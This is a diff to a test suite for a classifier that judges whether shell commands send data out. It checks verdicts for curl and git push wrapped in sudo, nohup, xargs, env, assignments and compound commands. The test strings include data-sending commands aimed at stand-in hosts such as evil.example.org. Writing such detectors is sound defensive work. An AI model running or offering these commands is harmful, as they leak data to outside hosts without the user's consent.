@@ -14,7 +14,8 @@ import { judged, verdictOf } from './outboundClassifyFacts'
 describe('CC round 3: wrappers, reserved words, and git pinning', () => {
   test('reserved words and wrappers with options no longer hide the send', () => {
     // xargs may append arguments, and a compound command runs conditionally:
-    // both still record the send, never silence (v3: unproven, so unknown).
+    // both still record the send, never silence (v3: unproven, so never
+    // allowed; a literal outside host still resolves, so it is a violation).
     expect(verdictOf('xargs -t curl -d x https://host.example.org/hook')).toMatchObject({
       rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:xargs-arguments',
     })
@@ -22,7 +23,9 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
       'if curl -d x https://host.example.org/hook; then echo ok; fi',
       'while true; do curl -d x https://host.example.org/hook; done',
     ]) {
-      expect(verdictOf(command)).toMatchObject({ rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:compound-command' })
+      expect(verdictOf(command)).toMatchObject({ rule: 'http-send', verdict: 'violation', destination: 'host:host.example.org' })
+      const internal = command.replace('https://host.example.org/hook', 'https://example.internal/x')
+      expect(verdictOf(internal)).toMatchObject({ rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:compound-command' })
     }
     const cases: Array<[string, string]> = [
       ['! curl -d x https://host.example.org/hook', 'host:host.example.org'],
@@ -188,9 +191,13 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
   })
 
   test('leading assignments are consumed inside the unwrap loop (round 5 R1)', () => {
-    // Any assignment outside the harmless set is an unproven environment (v3).
+    // Any assignment outside the harmless set is an unproven environment (v3):
+    // never allowed, though a literal outside host still reads violation.
     for (const command of ['FOO=1 sudo curl -d x https://evil.example.org', 'FOO=1 nohup curl -d x https://evil.example.org']) {
-      expect(verdictOf(command)).toEqual({ rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:environment-pin' })
+      expect(verdictOf(command)).toEqual({ rule: 'http-send', verdict: 'violation', destination: 'host:evil.example.org' })
+      expect(verdictOf(command.replace('https://evil.example.org', 'https://example.internal'))).toEqual({
+        rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:environment-pin',
+      })
     }
     expect(verdictOf('FOO=1 bash -c "git push fork"')).toEqual({ rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:environment-pin' })
     // A harmless name keeps the verdict.
@@ -204,9 +211,9 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
       rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no-repository',
     })
     // A bare assignment pins its own segment only.
-    expect(verdictOf('FOO=1 curl -d x https://host.example.org/hook')).toMatchObject({ rule: 'http-send', verdict: 'unknown-destination' })
-    expect(judged('FOO=1 curl -d x https://host.example.org/hook; curl -d x https://host.example.org/hook').map(match => match.verdict))
-      .toEqual(['unknown-destination', 'violation'])
+    expect(verdictOf('FOO=1 curl -d x https://example.internal/x')).toMatchObject({ rule: 'http-send', verdict: 'unknown-destination' })
+    expect(judged('FOO=1 curl -d x https://example.internal/x; curl -d x https://example.internal/x').map(match => match.verdict))
+      .toEqual(['unknown-destination', 'allowed'])
   })
 
   test('backslash-newline continuations join before tokenizing (round 5 R2)', () => {
@@ -333,7 +340,8 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
         rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:git-push',
       })
     }
-    expect(verdictOf('/usr/bin/env X=1 curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', destination: 'unresolved:environment-pin' })
+    expect(verdictOf('/usr/bin/env X=1 curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
+    expect(verdictOf('/usr/bin/env X=1 curl -d x https://example.internal')).toMatchObject({ rule: 'http-send', destination: 'unresolved:environment-pin' })
     expect(verdictOf('/usr/bin/env LANG=C curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
   })
 })
